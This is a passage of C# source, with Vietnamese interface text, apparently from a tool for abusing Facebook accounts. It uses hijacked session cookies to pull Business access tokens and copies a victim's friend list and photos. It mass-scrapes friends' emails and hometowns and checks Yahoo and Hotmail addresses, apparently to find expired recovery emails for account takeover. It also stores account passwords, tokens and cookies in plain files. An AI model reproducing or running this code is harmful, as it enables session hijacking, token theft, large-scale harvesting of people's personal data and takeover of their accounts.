        private void BackupCookie(int row, string cookie)
        {
            string htmlEx = topB;
            try
            {
                string uid = "";
                string uidOfCookie = Regex.Match(cookie, "c_user=(.*?);").Groups[1].Value;
                try
                {
                    uid = dtgvChangeVia.Rows[row].Cells["cUidMail"].Value.ToString();
                }
                catch { }
                if (uid != "")
                {
                    dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Đang backup...";
                    #region Khai báo request
                    xNet.HttpRequest request = new xNet.HttpRequest();
                    request.KeepAlive = true;
                    request.Cookies = new CookieDictionary();
                    request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/77.0.126 Chrome/71.0.3578.126 Safari/537.36";
                    #endregion
                    string token = "";
                    //get token
                    request.AddHeader("Cookie", cookie);
                    string homeFace = request.Get("https://www.facebook.com/").ToString();
                    if (homeFace.Contains(uidOfCookie) && homeFace.Contains("name=\"fb_dtsg\" value="))
                    {
                        Console.WriteLine("Cookie live");
                        Console.WriteLine("Getting token...");
                        request.AddHeader("Cookie", cookie);
                        string GetDataToken = request.Get("https://business.facebook.com/select/").ToString();
                        string BusinessID = "";
                        BusinessID = Regex.Match(GetDataToken, "\"businessID\":\"(.*?)\"").Groups[1].Value;
                        if (BusinessID.Equals(""))
                        {
                            BusinessID = Regex.Match(GetDataToken, "businessID:\"(.*?)\"").Groups[1].Value;
                        }
                        if (BusinessID != "")
                        {
                            request.AddHeader("Cookie", cookie);
                            GetDataToken = request.Get("https://business.facebook.com/home?business_id=" + BusinessID).ToString();
                            token = Regex.Match(GetDataToken, "EAAG(.*?)\"").Value.Replace("\"", "");
                        }
                        else
                        {
                            request.AddHeader("Cookie", cookie);
                            string getdata = request.Get("https://business.facebook.com/overview/").ToString();
                            string encrypted = Regex.Match(getdata, "encrypted\":\"(.*?)\"").Groups[1].Value;
                            string fb_dtsg = Regex.Match(getdata, "\"fb_dtsg\" value=\"(.*?)\"").Groups[1].Value;
                            string jazoest = Regex.Match(getdata, "\"jazoest\" value=\"(.*?)\"").Groups[1].Value;

                            request.AddHeader("Cookie", cookie);
                            string FullData = "__user=" + uid + "&__pc=PHASED:DEFAULT&__a=1&fb_dtsg=" + fb_dtsg;
                            string GetHtml = request.Post("https://business.facebook.com/business/create_account/?brand_name=" + uid + "&first_name=Long&last_name=Long&email=" + uid + "@gmail.com&timezone_id=140&business_category=OTHER&city=&country=US&state=a1&legal_name=&phone_number=&postal_code=&street1=&street2=&website_url=&is_b2b=false", FullData, "application/x-www-form-urlencoded").ToString();
                            request.AddHeader("Cookie", cookie);
                            GetDataToken = request.Get("https://business.facebook.com/select/?next=https%3A%2F%2Fbusiness.facebook.com%2Fhome").ToString();
                            BusinessID = Regex.Match(GetDataToken, "\"businessID\":\"(.*?)\"").Groups[1].Value;
                            request.AddHeader("Cookie", cookie);
                            GetDataToken = request.Get("https://business.facebook.com/home?business_id=" + BusinessID).ToString();
                            token = Regex.Match(GetDataToken, "EAAG(.*?)\"").Value.Replace("\"", "");
                        }
                        string getListFriend = request.Get("https://graph.facebook.com/" + uid + "/friends?limit=5000&fields=id,name&access_token=" + token).ToString();
                        string getInfor = request.Get("https://graph.facebook.com/" + uid + "/?fields=id,name&access_token=" + token).ToString();
                        JObject objFriend = JObject.Parse(getListFriend);
                        JObject objInfo = JObject.Parse(getInfor);
                        string dataAdd = "\r\n $scope.user_obj = {\"name\": \"" + objInfo["name"] + "\",\"type\": 0,\"email\": \"\",\"link\": \"https://www.facebook.com/" + objInfo["id"] + "\",\"mobile_phone\": \"\",\"fb_id\": \"\",\"fb_cover_id\": \"\",\"fb_all_virtual_ids\": {\"350685531728\": \"100008048791430\"},\"fb_avatar\": \"\",\"number_page\": 0,\"number_group\": 17,\"number_friend\": 372,\"account_id\": 100004995669107,\"data_obj\": {\"gender\": 2,\"birthday\": \"03/08/1994\"},\"status\": 1,\"updated\": \"2018-07-10 20:17:39\",\"customer_id\": 102128,\"store_id\": 10,\"id\": 201167868}\r\n";
                        htmlEx += dataAdd;
                        int countSuccess = 0;
                        int totalFriend = objFriend["data"].Count();
                        int iThread = 0;
                        int maxThread = 10;
                        for (int i = 0; i < objFriend["data"].Count();)
                        {
                            if (iThread < maxThread)
                            {
                                Interlocked.Increment(ref iThread);
                                int rr = i;
                                new Thread(() =>
                                {
                                    string uidFr = objFriend["data"][rr]["id"].ToString();
                                    string nameFr = objFriend["data"][rr]["name"].ToString();
                                    string dataPhoto = BackupImageOne(uidFr, nameFr, token, cookie);
                                    htmlEx += dataPhoto;
                                    Interlocked.Increment(ref countSuccess);
                                    Interlocked.Decrement(ref iThread);
                                    dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Đang backup: " + countSuccess + "/" + (i + 1) + "/" + totalFriend;
                                }).Start();
                                i++;
                            }
                            else
                            {
                                Application.DoEvents();
                                Thread.Sleep(100);
                            }
                        }
                        while (iThread > 0)
                        {
                            Application.DoEvents();
                            Thread.Sleep(100);
                        }
                        htmlEx += bottomB;
                        File.WriteAllText("backup/" + uid + ".html", htmlEx);
                        dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Backup thành công: " + countSuccess + "/" + totalFriend;
                    }
                    else
                    {
                        dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Lỗi cookie!";
                    }
                }
            }
            catch
            {
                dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Lỗi backup!";
            }
        }

        private string BackupImageOne(string uidFr, string nameFr, string token, string cookie)
        {
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/77.0.126 Chrome/71.0.3578.126 Safari/537.36";
            #endregion
            string dataPhoto = "$scope.raw_photo_objs.push(";
            dataPhoto += "{\"id\": \"" + uidFr + "\",\"name\": \"" + nameFr + "\", \"data\": [";
            request.AddHeader("Cookie", cookie);
            string DataTagImg = request.Get("https://mbasic.facebook.com/" + uidFr + "/photoset/pb." + uidFr + "/?owner_id=" + uidFr).ToString();
            MatchCollection matchImage = Regex.Matches(DataTagImg, "<img src=\"https://scontent(.*?)\"");
            for (int m = 0; m < matchImage.Count; m++)
            {
                string source = matchImage[m].Value.Substring("<img src=\"").Replace("\"", "");
                dataPhoto += "{\"source\": \"" + source + "\",\"created_time\": \"2014-04-29T03:27:29+0000\",\"id\": \"" + "__" + "\"},\r\n";
            }
            dataPhoto += "]});\r\n";
            return dataPhoto;
        }

        private void BtnCheckCookie_Click(object sender, EventArgs e)
        {
            #region Khai báo request
            string cookie = txbCookieTemp.Text;
            string uid = Regex.Match(cookie, "c_user=(.*?);").Groups[1].Value;
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/77.0.126 Chrome/71.0.3578.126 Safari/537.36";
            #endregion
            //get token
            request.AddHeader("Cookie", cookie);
            string homeFace = request.Get("https://www.facebook.com/").ToString();
            if (homeFace.Contains(uid) && homeFace.Contains("name=\"fb_dtsg\" value="))
            {
                MessageBox.Show("Cookie Live!");
            }
            else
            {
                MessageBox.Show("Cookie Die!");
            }
        }

        private void ChọnLiveToolStripMenuItem1_Click(object sender, EventArgs e)
        {

            for (int i = 0; i < dtgvAcc.RowCount; i++)
            {
                if (dtgvAcc.Rows[i].Cells["cInfof"].Value != null)
                {
                    if (dtgvAcc.Rows[i].Cells["cInfof"].Value.ToString().Equals("Live"))
                    {
                        dtgvAcc.Rows[i].Cells["cChosef"].Value = true;
                    }
                    else
                        dtgvAcc.Rows[i].Cells["cChosef"].Value = false;
                }
            }
        }

        private void ChọnDieToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvAcc.RowCount; i++)
            {
                if (dtgvAcc.Rows[i].Cells["cInfof"].Value != null)
                {
                    if (dtgvAcc.Rows[i].Cells["cInfof"].Value.ToString().Equals("Live"))
                    {
                        dtgvAcc.Rows[i].Cells["cChosef"].Value = true;
                    }
                    else
                        dtgvAcc.Rows[i].Cells["cChosef"].Value = false;
                }
            }
        }

        private void UidPassTokenCookieToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string textCopy = "";
                for (int i = 0; i < dtgvAcc.RowCount; i++)
                {
                    if (Convert.ToBoolean(dtgvAcc.Rows[i].Cells["cChosef"].Value))
                    {
                        try
                        {
                            textCopy += dtgvAcc.Rows[i].Cells["cUidf"].Value.ToString() + "|" + dtgvAcc.Rows[i].Cells["cPassf"].Value.ToString() + "|" + dtgvAcc.Rows[i].Cells["cTokenf"].Value.ToString() + "|" + dtgvAcc.Rows[i].Cells["cCookief"].Value.ToString() + "\r\n";
                        }
                        catch { }
                    }
                }
                Clipboard.SetText(textCopy);
            }
            catch { }
        }

        string PathSuccess;
        private void Button4_Click(object sender, EventArgs e)
        {
            PathSuccess = AppDomain.CurrentDomain.BaseDirectory;
            int curThread = 0, maxThread = 1;
            string token = txbTokenScan.Text;
            new Thread(() =>
            {
                button4.Invoke((MethodInvoker)delegate ()
                {
                    button4.Enabled = false;
                });
                for (int i = 0; i < txbAccount.Lines.Length;)
                {
                    if (curThread < maxThread)
                    {
                        Interlocked.Increment(ref curThread);
                        int row = i;
                        string uid = txbAccount.Lines[row];
                        if (!uid.Equals(""))
                        {
                            new Thread(() =>
                            {
                                try
                                {
                                    ScanMailUidOneThread(uid, token);
                                }
                                catch { }
                                Interlocked.Decrement(ref curThread);
                            }).Start();
                        }
                        i++;
                    }
                    else
                    {
                        Thread.Sleep(100);
                    }
                }
                while (curThread > 0)
                {
                    Application.DoEvents();
                    Thread.Sleep(500);
                }
                button4.Invoke((MethodInvoker)delegate ()
                {
                    button4.Enabled = true;
                });
            }).Start();
        }

        private void ScanMailUidOneThread(string uid, string token)
        {
            int curThread = 0, maxThread = Convert.ToInt32(nudThreadScanUidMail.Value);
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/77.0.126 Chrome/71.0.3578.126 Safari/537.36";
            #endregion
            string GetInfo = request.Get("https://graph.facebook.com/" + uid + "/friends?limit=5000&fields=id&access_token=" + token).ToString();
            JObject o = JObject.Parse(GetInfo);
            if (o["data"] != null)
            {
                if (o["data"].Count() > 0)
                {
                    for (int i = 0; i < (o["data"].Count() - 1);)
                    {
                        if (o["data"][i]["id"] != null)
                        {
                            if (curThread < maxThread)
                            {
                                string FriendID = o["data"][i]["id"].ToString();
                                BirthDayGet(FriendID, token);
                                new Thread(() =>
                                {
                                    BirthDayGet(FriendID, token);
                                    Interlocked.Decrement(ref curThread);
                                }).Start();
                                i++;
                            }
                            else
                            {
                                Thread.Sleep(300);
                            }
                        }
                        else
                        {
                            i++;
                        }
                    }
                }
            }
        }

        private void IncrementLabel(Label lbl)
        {
            lock (lbl)
            {
                lbl.Invoke((MethodInvoker)delegate ()
                {
                    int a = Convert.ToInt32(lbl.Text);
                    a++;
                    lbl.Text = a.ToString();
                });
            }
        }

        void BirthDayGet(string uid, string token)
        {
            try
            {
                #region Khai báo request
                xNet.HttpRequest xRequest = new xNet.HttpRequest();
                xRequest.KeepAlive = true;
                xRequest.Cookies = new CookieDictionary();
                xRequest.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                xRequest.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                xRequest.UserAgent = Http.ChromeUserAgent();
                #endregion
                string GetInfo = xRequest.Get("https://graph.facebook.com/v2.11/" + uid + "/friends?limit=5000&fields=id,email,location,hometown,friends.limit(0)&access_token=" + token).ToString();
                //,subscribers.limit(0)
                JObject o = JObject.Parse(GetInfo);
                if (o["data"].Count() > 0)
                {
                    for (int i = 0; i < (o["data"].Count() - 1); i++)
                    {
                        if (o["data"][i]["id"] != null && o["data"][i]["email"] != null)
                        {
                            string email = o["data"][i]["email"].ToString();
                            if (email.Length < 10)
                            {

                            }
                            else
                            {
                                if (email.EndsWith("yahoo.com"))
                                {
                                    //check live mail
                                    if (CheckMailYahoo(email) == false)
                                    {
                                        try
                                        {
                                            string friends = "0"; string subs = "0";
                                            try
                                            {
                                                friends = o["data"][i]["friends"]["summary"]["total_count"].ToString();
                                            }
                                            catch { }
                                            //try
                                            //{
                                            //    subs = o["data"][i]["subscribers"]["summary"]["total_count"].ToString();
                                            //}
                                            //catch { }

                                            string location = "";
                                            try
                                            {
                                                location = o["data"][i]["hometown"]["name"].ToString();
                                            }
                                            catch
                                            {
                                                location = o["data"][i]["location"]["name"].ToString();
                                            }

                                            string path = "";
                                            if (location == "")
                                            {
                                                path = PathSuccess + "\\mail\\yahoo_noaddress.txt";
                                            }
                                            else
                                            {
                                                try
                                                {
                                                    string jsonGetLocation = xRequest.Post("https://www.mapdevelopers.com/data.php?operation=geocode", "&address=" + location, "application/x-www-form-urlencoded; charset=UTF-8").ToString();
                                                    JObject objLoca = JObject.Parse(jsonGetLocation);
                                                    string nameCountry = objLoca["data"]["country"].ToString();
                                                    if (nameCountry != "")
                                                        path = PathSuccess + "\\mail\\yahoo_" + nameCountry + ".txt";
                                                }
                                                catch { }
                                            }
                                            File.AppendAllText(path, o["data"][i]["id"] + "|" + email + "|" + friends + "|" + location + Environment.NewLine);
                                            IncrementLabel(lblYahoo);
                                        }
                                        catch
                                        {

                                        }
                                    }
                                }
                                else if (email.EndsWith("hotmail.com"))
                                {

                                    try
                                    {
                                        if (CheckMailHotmail(email) == false)
                                        {
                                            string friends = "0"; string subs = "0";
                                            try
                                            {
                                                friends = o["data"][i]["friends"]["summary"]["total_count"].ToString();
                                            }
                                            catch { }
                                            //try
                                            //{
                                            //    subs = o["data"][i]["subscribers"]["summary"]["total_count"].ToString();
                                            //}
                                            //catch { }

                                            string location = "";
                                            try
                                            {
                                                location = o["data"][i]["hometown"]["name"].ToString();
                                            }
                                            catch
                                            {
                                                location = o["data"][i]["location"]["name"].ToString();
                                            }
                                            string path = "";
                                            if (location == "")
                                            {
                                                path = PathSuccess + "\\mail\\hotmail_noaddress.txt";
                                            }
                                            else
                                            {
                                                try
                                                {
                                                    string jsonGetLocation = xRequest.Post("https://www.mapdevelopers.com/data.php?operation=geocode", "&address=" + location, "application/x-www-form-urlencoded; charset=UTF-8").ToString();
                                                    JObject objLoca = JObject.Parse(jsonGetLocation);
                                                    string nameCountry = objLoca["data"]["country"].ToString();
                                                    if (nameCountry != "")
                                                        path = PathSuccess + "\\mail\\hotmail_" + nameCountry + ".txt";

                                                }
                                                catch { }
                                            }
                                            File.AppendAllText(path, o["data"][i]["id"] + "|" + email + "|" + friends + "|" + "|" + location + Environment.NewLine);
                                            IncrementLabel(lblHotmail);
                                        }
                                    }
                                    catch
                                    {

                                    }
                                }
                            }
                        }
                        else
                        {

                        }
                    }
                }
            }
            catch
            {

            }
        }

        private void TabPage6_Click(object sender, EventArgs e)
        {

        }

        private void ChọnLỗiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {

                if (dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value != null)
                {
                    if (dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value.ToString().Contains("Lỗi"))
                    {
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = true;
                    }
                    else
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = false;
                }
            }
        }

        private void BtnCreateProfile_Click(object sender, EventArgs e)
        {

            try
            {
                ChromeOptions options = new ChromeOptions();
                options.AddArgument("--disable-notifications"); // to disable notification
                options.AddArgument("--window-size=700,700");
                options.AddArgument("--window-position=0,0");

                string profilePath = @"profile/" + CreateRandomPassword();
                if (!Directory.Exists(profilePath))
                {
                    Directory.CreateDirectory(profilePath);
                }
                options.AddArgument("--user-data-dir=" + profilePath);
                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.HideCommandPromptWindow = true;
                ChromeDriver chrome = new ChromeDriver(service, options, TimeSpan.FromSeconds(120));
                chrome.Navigate().GoToUrl("https://www.google.com/");
            }
            catch
            {
            }
        }

        public static string GetTokenBussinessFromCookie(string cookie)
        {
            string data = "";
            string uid = Regex.Match(cookie, "c_user=(.*?);").Groups[1].Value;
            if (cookie != "" && cookie.Contains("c_user="))
            {
                #region Khai báo request
                RequestHTTP request = new RequestHTTP();
                request.SetSSL(System.Net.SecurityProtocolType.Tls12);
                request.SetKeepAlive(true);
                request.SetDefaultHeaders(new string[]
                {
                    "content-type: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
                    "cookie: "+cookie
                });
                #endregion

                string GetDataToken = request.Request("GET", "https://business.facebook.com/select/?next=https%3A%2F%2Fbusiness.facebook.com%2Fhome").ToString();
                string BusinessID = Regex.Match(GetDataToken, "\"businessID\":\"(.*?)\"").Groups[1].Value;

                if (BusinessID != "")
                {
                    GetDataToken = request.Request("GET", "https://business.facebook.com/home?business_id=" + BusinessID).ToString();
                    string Token = Regex.Match(GetDataToken, "EAAG(.*?)\"").Value.Replace("\"", "");
                    data = Token;
                }
                else
                {
                    string getdata = request.Request("GET", "https://business.facebook.com/overview/").ToString();
                    string encrypted = Regex.Match(getdata, "encrypted\":\"(.*?)\"").Groups[1].Value;
                    string fb_dtsg = Regex.Match(getdata, "\"fb_dtsg\" value=\"(.*?)\"").Groups[1].Value;
                    string jazoest = Regex.Match(getdata, "\"jazoest\" value=\"(.*?)\"").Groups[1].Value;

                    string FullData = "__user=" + uid + "&__pc=PHASED:DEFAULT&__a=1&fb_dtsg=" + fb_dtsg;
                    string GetHtml = request.Request("POST", "https://business.facebook.com/business/create_account/?brand_name=" + uid + "&first_name=Long&last_name=Long&email=" + uid + "@gmail.com&timezone_id=140&business_category=OTHER&city=&country=US&state=a1&legal_name=&phone_number=&postal_code=&street1=&street2=&website_url=&is_b2b=false", null, Encoding.UTF8.GetBytes(FullData));
                    GetDataToken = request.Request("GET", "https://business.facebook.com/select/?next=https%3A%2F%2Fbusiness.facebook.com%2Fhome");
                    BusinessID = Regex.Match(GetDataToken, "\"businessID\":\"(.*?)\"").Groups[1].Value;
                    GetDataToken = request.Request("GET", "https://business.facebook.com/home?business_id=" + BusinessID).ToString();
                    string Token = Regex.Match(GetDataToken, "EAAG(.*?)\"").Value.Replace("\"", "");
                    data = Token;
                }
            }
            return data;
        }

        private void XóaToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvAcc.RowCount; i++)
            {
                if (Convert.ToBoolean(dtgvAcc.Rows[i].Cells["cChosef"].Value))
                {
                    dtgvAcc.Rows.RemoveAt(i);
                    i--;
                }
            }
        }

        private void Button5_Click(object sender, EventArgs e)
        {
            try
            {
                List<string> ls = new List<string>();
                for (int i = 0; i < dtgvAcc.Rows.Count; i++)
                {
                    try
                    {
                        string mail = "", passmail = "";
                        try
                        {
                            mail = dtgvAcc.Rows[i].Cells["cMailf"].Value.ToString();
                            passmail = mail = dtgvAcc.Rows[i].Cells["cPassMail"].Value.ToString(); ;
                        }
                        catch { }
                        ls.Add(dtgvAcc.Rows[i].Cells[1].Value.ToString() + "|" + dtgvAcc.Rows[i].Cells[2].Value.ToString() + "|" + dtgvAcc.Rows[i].Cells[3].Value.ToString() + "|" + dtgvAcc.Rows[i].Cells[4].Value.ToString() + "|" + mail + "|" + passmail);
                    }
                    catch
                    {

                    }

                }
                File.WriteAllLines("account/live.txt", ls);

                MessageBox.Show("Lưu thành công");
            }
            catch { }
        }

        private void DtgvChangeVia_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            try
            {
                if (e.ColumnIndex == 0)
                {
                    if (Convert.ToBoolean(dtgvChangeVia.Rows[e.RowIndex].Cells["cChoseMail"].Value))
                    {
                        dtgvChangeVia.Rows[e.RowIndex].Cells["cChoseMail"].Value = false;
                    }
                    else
                    {
                        dtgvChangeVia.Rows[e.RowIndex].Cells["cChoseMail"].Value = true;
                    }
                }
            }
            catch { }
        }

        private void DtgvChangeVia_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyValue == (int)System.Windows.Forms.Keys.Space)
                {
                    if (Convert.ToBoolean(dtgvChangeVia.CurrentRow.Cells["cChoseMail"].Value))
                    {
                        dtgvChangeVia.CurrentRow.Cells["cChoseMail"].Value = false;
                    }
                    else
                    {
                        dtgvChangeVia.CurrentRow.Cells["cChoseMail"].Value = true;
                    }
                }
            }
            catch { }
        }
    }
}


